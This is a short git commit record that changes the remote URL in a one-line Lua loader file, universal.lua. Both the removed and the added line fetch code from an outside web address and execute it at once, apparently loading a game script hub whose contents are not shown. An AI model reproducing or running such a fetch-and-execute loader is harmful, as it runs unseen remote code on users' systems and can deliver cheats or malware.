f6f1b861d18593e6c6504fb2c244766ff656e024
piloshub <supbigy@gmail.com>
2026-08-10 09:02:02 +0800

    Update HTTP request URL in universal.lua

--- universal.lua
+++ universal.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjdmM2U2MzRkLTY0OGMtNGU0MC1iMjZlLTMyZjY0MWQ5N2E3YyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJvdmVyZHJpdmUifX0"))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/T1wfLEuuqpN4FKQA/raw"))()
